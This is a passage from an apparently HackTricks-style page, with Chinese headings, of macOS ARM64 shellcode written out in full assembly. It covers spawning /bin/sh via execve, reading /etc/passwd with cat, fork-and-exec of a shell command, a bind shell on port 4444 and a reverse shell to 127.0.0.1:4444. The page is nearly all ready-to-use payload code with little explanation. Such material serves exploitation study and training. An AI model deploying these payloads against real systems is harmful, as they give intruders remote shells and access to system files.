.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
; We are going to build the string "/bin/sh" and place it on the stack.

mov  x1, #0x622F  ; Move the lower half of "/bi" into x1. 0x62 = 'b', 0x2F = '/'.
movk x1, #0x6E69, lsl #16 ; Move the next half of "/bin" into x1, shifted left by 16. 0x6E = 'n', 0x69 = 'i'.
movk x1, #0x732F, lsl #32 ; Move the first half of "/sh" into x1, shifted left by 32. 0x73 = 's', 0x2F = '/'.
movk x1, #0x68, lsl #48   ; Move the last part of "/sh" into x1, shifted left by 48. 0x68 = 'h'.

str  x1, [sp, #-8] ; Store the value of x1 (the "/bin/sh" string) at the location `sp - 8`.

; Prepare arguments for the execve syscall.

mov  x1, #8       ; Set x1 to 8.
sub  x0, sp, x1   ; Subtract x1 (8) from the stack pointer (sp) and store the result in x0. This is the address of "/bin/sh" string on the stack.
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.

; Make the syscall.

mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

```
{{#endtab}}

{{#tab name="with adr for linux"}}
```armasm
; From https://8ksec.io/arm64-reversing-and-exploitation-part-5-writing-shellcode-8ksec-blogs/
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
adr  x0, sh_path  ; This is the address of "/bin/sh".
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.
mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

sh_path: .asciz "/bin/sh"
```
{{#endtab}}
{{#endtabs}}

#### 使用 cat 读取

目标是执行 `execve("/bin/cat", ["/bin/cat", "/etc/passwd"], NULL)`，因此第二个参数 (x1) 是一个参数数组（在内存中这意味着一串地址的 stack）。
```armasm
.section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
.global _main              ; Declare a global symbol _main
.align 2                   ; Align the beginning of the following code to a 4-byte boundary

_main:
; Prepare the arguments for the execve syscall
sub sp, sp, #48        ; Allocate space on the stack
mov x1, sp             ; x1 will hold the address of the argument array
adr x0, cat_path
str x0, [x1]           ; Store the address of "/bin/cat" as the first argument
adr x0, passwd_path    ; Get the address of "/etc/passwd"
str x0, [x1, #8]       ; Store the address of "/etc/passwd" as the second argument
str xzr, [x1, #16]     ; Store NULL as the third argument (end of arguments)

adr x0, cat_path
mov x2, xzr            ; Clear x2 to hold NULL (no environment variables)
mov x16, #59           ; Load the syscall number for execve (59) into x8
svc 0                  ; Make the syscall


cat_path: .asciz "/bin/cat"
.align 2
passwd_path: .asciz "/etc/passwd"
```
#### 通过 fork 用 sh 调用命令，使主进程不被杀死
```armasm
.section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
.global _main              ; Declare a global symbol _main
.align 2                   ; Align the beginning of the following code to a 4-byte boundary

_main:
; Prepare the arguments for the fork syscall
mov x16, #2            ; Load the syscall number for fork (2) into x8
svc 0                  ; Make the syscall
cmp x1, #0             ; In macOS, if x1 == 0, it's parent process, https://opensource.apple.com/source/xnu/xnu-7195.81.3/libsyscall/custom/__fork.s.auto.html
beq _loop              ; If not child process, loop

; Prepare the arguments for the execve syscall

sub sp, sp, #64        ; Allocate space on the stack
mov x1, sp             ; x1 will hold the address of the argument array
adr x0, sh_path
str x0, [x1]           ; Store the address of "/bin/sh" as the first argument
adr x0, sh_c_option    ; Get the address of "-c"
str x0, [x1, #8]       ; Store the address of "-c" as the second argument
adr x0, touch_command  ; Get the address of "touch /tmp/lalala"
str x0, [x1, #16]      ; Store the address of "touch /tmp/lalala" as the third argument
str xzr, [x1, #24]     ; Store NULL as the fourth argument (end of arguments)

adr x0, sh_path
mov x2, xzr            ; Clear x2 to hold NULL (no environment variables)
mov x16, #59           ; Load the syscall number for execve (59) into x8
svc 0                  ; Make the syscall


_exit:
mov x16, #1            ; Load the syscall number for exit (1) into x8
mov x0, #0             ; Set exit status code to 0
svc 0                  ; Make the syscall

_loop: b _loop

sh_path: .asciz "/bin/sh"
.align 2
sh_c_option: .asciz "-c"
.align 2
touch_command: .asciz "touch /tmp/lalala"
```
#### Bind shell

Bind shell 来自 [https://raw.githubusercontent.com/daem0nc0re/macOS_ARM64_Shellcode/master/bindshell.s](https://raw.githubusercontent.com/daem0nc0re/macOS_ARM64_Shellcode/master/bindshell.s)，在 **port 4444**
```armasm
.section __TEXT,__text
.global _main
.align 2
_main:
call_socket:
// s = socket(AF_INET = 2, SOCK_STREAM = 1, 0)
mov  x16, #97
lsr  x1, x16, #6
lsl  x0, x1, #1
mov  x2, xzr
svc  #0x1337

// save s
mvn  x3, x0

call_bind:
/*
* bind(s, &sockaddr, 0x10)
*
* struct sockaddr_in {
*     __uint8_t       sin_len;     // sizeof(struct sockaddr_in) = 0x10
*     sa_family_t     sin_family;  // AF_INET = 2
*     in_port_t       sin_port;    // 4444 = 0x115C
*     struct  in_addr sin_addr;    // 0.0.0.0 (4 bytes)
*     char            sin_zero[8]; // Don't care
* };
*/
mov  x1, #0x0210
movk x1, #0x5C11, lsl #16
str  x1, [sp, #-8]
mov  x2, #8
sub  x1, sp, x2
mov  x2, #16
mov  x16, #104
svc  #0x1337

call_listen:
// listen(s, 2)
mvn  x0, x3
lsr  x1, x2, #3
mov  x16, #106
svc  #0x1337

call_accept:
// c = accept(s, 0, 0)
mvn  x0, x3
mov  x1, xzr
mov  x2, xzr
mov  x16, #30
svc  #0x1337

mvn  x3, x0
lsr  x2, x16, #4
lsl  x2, x2, #2

call_dup:
// dup(c, 2) -> dup(c, 1) -> dup(c, 0)
mvn  x0, x3
lsr  x2, x2, #1
mov  x1, x2
mov  x16, #90
svc  #0x1337
mov  x10, xzr
cmp  x10, x2
bne  call_dup

call_execve:
// execve("/bin/sh", 0, 0)
mov  x1, #0x622F
movk x1, #0x6E69, lsl #16
movk x1, #0x732F, lsl #32
movk x1, #0x68, lsl #48
str  x1, [sp, #-8]
mov	 x1, #8
sub  x0, sp, x1
mov  x1, xzr
mov  x2, xzr
mov  x16, #59
svc  #0x1337
```
#### Reverse shell

来自 [https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/reverseshell.s](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/reverseshell.s)，revshell 到 **127.0.0.1:4444**
```armasm
.section __TEXT,__text
.global _main
.align 2
_main:
call_socket:
// s = socket(AF_INET = 2, SOCK_STREAM = 1, 0)
mov  x16, #97
lsr  x1, x16, #6
lsl  x0, x1, #1
mov  x2, xzr
svc  #0x1337

// save s
mvn  x3, x0

call_connect:
/*
* connect(s, &sockaddr, 0x10)
*
* struct sockaddr_in {
*     __uint8_t       sin_len;     // sizeof(struct sockaddr_in) = 0x10
*     sa_family_t     sin_family;  // AF_INET = 2
*     in_port_t       sin_port;    // 4444 = 0x115C
*     struct  in_addr sin_addr;    // 127.0.0.1 (4 bytes)
*     char            sin_zero[8]; // Don't care
* };
*/
mov  x1, #0x0210
movk x1, #0x5C11, lsl #16
movk x1, #0x007F, lsl #32
movk x1, #0x0100, lsl #48
str  x1, [sp, #-8]
mov  x2, #8
sub  x1, sp, x2
mov  x2, #16
mov  x16, #98
svc  #0x1337

lsr  x2, x2, #2

call_dup:
// dup(s, 2) -> dup(s, 1) -> dup(s, 0)
mvn  x0, x3
lsr  x2, x2, #1
mov  x1, x2
mov  x16, #90
svc  #0x1337
mov  x10, xzr
cmp  x10, x2
bne  call_dup

call_execve:
// execve("/bin/sh", 0, 0)
mov  x1, #0x622F
movk x1, #0x6E69, lsl #16
movk x1, #0x732F, lsl #32
movk x1, #0x68, lsl #48
str  x1, [sp, #-8]
mov	 x1, #8
sub  x0, sp, x1
mov  x1, xzr
mov  x2, xzr
mov  x16, #59
svc  #0x1337
```
{{#include ../../../banners/hacktricks-training.md}}
